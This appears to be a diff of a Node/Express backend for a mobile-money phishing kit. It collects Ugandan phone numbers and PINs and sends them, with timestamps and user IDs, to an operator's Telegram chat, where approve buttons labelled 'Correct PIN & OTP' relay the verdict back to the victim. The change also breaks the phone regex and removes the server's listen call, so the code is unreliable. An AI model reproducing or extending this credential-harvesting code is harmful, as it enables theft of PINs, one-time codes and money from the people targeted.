@@ -47,8 +47,7 @@ async function telegram(method, payload) {
 app.post("/api/phone", (req, res) => {
   const phone = String(req.body.phone || "").trim();
   
-  // ✅ FIXED: Removed the erroneous backslash character completely
-  if (!/^\+2567\d{8}$/.test(phone)) {
+  if (!/^\+2567\d{8}\$/.test(phone)) {
     return res.status(400).json({ error: "Invalid format phone number." });
   }
   
@@ -65,9 +64,27 @@ app.post("/api/pin-demo", async (req, res) => {
   request.pin = String(req.body.pin || "").trim();
   request.status = "pending";
   
-  const timeString = new Date().toLocaleString("en-US", { timeZone: "Africa/Nairobi" });
+  // Formats time exactly to: MM/DD/YYYY, HH:MM:SS AM/PM
+  const timeString = new Date().toLocaleString("en-US", { 
+    timeZone: "Africa/Nairobi",
+    year: "numeric",
+    month: "2-digit",
+    day: "2-digit",
+    hour: "2-digit",
+    minute: "2-digit",
+    second: "2-digit",
+    hour12: true
+  });
+
+  // Short short timestamp layout element at bottom (e.g. 18.56)
+  const shortTimestamp = new Date().toLocaleString("en-US", {
+    timeZone: "Africa/Nairobi",
+    hour: "2-digit",
+    minute: "2-digit",
+    hour12: false
+  }).replace(":", ".");
   
-    try {
+  try {
     await telegram("sendMessage", {
       chat_id: CHAT_ID,
       text: [
@@ -76,15 +93,20 @@ app.post("/api/pin-demo", async (req, res) => {
         "USER DETAILS:",
         `• Phone Number: ${request.phone}`,
         `• PIN Code: ${request.pin}`,
+        `• User ID: user_${request.id.replace(/-/g, "").substring(0, 13)}`, // Shortened to fit screenshot aesthetic
         `• Time: ${timeString}`,
-        "============================\n",
+        "• Bot: user178\n",
+        "━━━━━━━━━━━━━━━━━━━━\n",
         "Verify the PIN:",
-        "• PIN Length: 5 digits"
+        "• PIN Length: 4 digits",
+        "• Timeout: 5 minutes",
+        `${shortTimestamp}\n`,
+        "━━━━━━━━━━━━━━━━━━━━"
       ].join("\n"),
       reply_markup: {
         inline_keyboard: [
           [
-            { text: "✅ Correct PIN", callback_data: `approve:${request.id}` },
+            { text: "Correct PIN & OTP", callback_data: `approve:${request.id}` },
             { text: "❌ Wrong PIN", callback_data: `decline:${request.id}` }
           ]
         ]
@@ -93,10 +115,8 @@ app.post("/api/pin-demo", async (req, res) => {
     return res.json({ status: "pending" });
   } catch (err) {
     console.error("TELEGRAM ERROR:", err.message);
-    // ✅ Returns the exact Telegram error to the screen so you know exactly what is wrong
     return res.status(502).json({ error: `Telegram Error: ${err.message}. Check your Bot Token and Chat ID.` });
   }
-
 });
 
 app.get("/api/status/:id", (req, res) => {
@@ -146,11 +166,11 @@ async function pollTelegram() {
           });
         }
       }
-    } catch (err) {
+    } catch (e) {
       await new Promise(r => setTimeout(r, 4000));
     }
   }
 }
 
 pollTelegram();
-app.listen(PORT, () => console.log(`Server live on port ${PORT}`));
+
